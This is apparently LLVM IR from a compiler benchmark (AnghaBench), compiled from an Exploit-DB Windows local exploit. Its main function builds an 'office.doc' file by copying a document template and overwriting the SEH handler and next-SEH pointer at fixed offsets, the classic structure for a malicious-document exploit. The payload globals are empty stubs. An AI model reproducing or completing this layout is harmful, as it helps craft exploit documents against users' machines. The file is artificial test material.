; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_14092.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_14092.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@rawdoc = common dso_local global i32 0, align 4
@nseh = common dso_local global i32 0, align 4
@seh = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"office.doc\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"wb\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [200000 x i8], align 16
  %3 = alloca i32*, align 8
  store i32 0, i32* %1, align 4
  %4 = getelementptr inbounds [200000 x i8], [200000 x i8]* %2, i64 0, i64 0
  %5 = load i32, i32* @rawdoc, align 4
  %6 = call i32 @memcpy(i8* %4, i32 %5, i32 101888)
  %7 = getelementptr inbounds [200000 x i8], [200000 x i8]* %2, i64 0, i64 0
  %8 = getelementptr inbounds i8, i8* %7, i64 79555
  %9 = load i32, i32* @nseh, align 4
  %10 = call i32 @memcpy(i8* %8, i32 %9, i32 4)
  %11 = getelementptr inbounds [200000 x i8], [200000 x i8]* %2, i64 0, i64 0
  %12 = getelementptr inbounds i8, i8* %11, i64 79559
  %13 = load i32, i32* @seh, align 4
  %14 = call i32 @memcpy(i8* %12, i32 %13, i32 4)
  %15 = call i32* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %15, i32** %3, align 8
  %16 = load i32*, i32** %3, align 8
  %17 = icmp ne i32* %16, null
  br i1 %17, label %20, label %18

18:                                               ; preds = %0
  %19 = call i32 (...) @error_handle()
  br label %20

20:                                               ; preds = %18, %0
  %21 = getelementptr inbounds [200000 x i8], [200000 x i8]* %2, i64 0, i64 0
  %22 = load i32*, i32** %3, align 8
  %23 = call i32 @fwrite(i8* %21, i32 1, i32 101888, i32* %22)
  %24 = load i32*, i32** %3, align 8
  %25 = call i32 @fclose(i32* %24)
  ret i32 0
}

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @error_handle(...) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
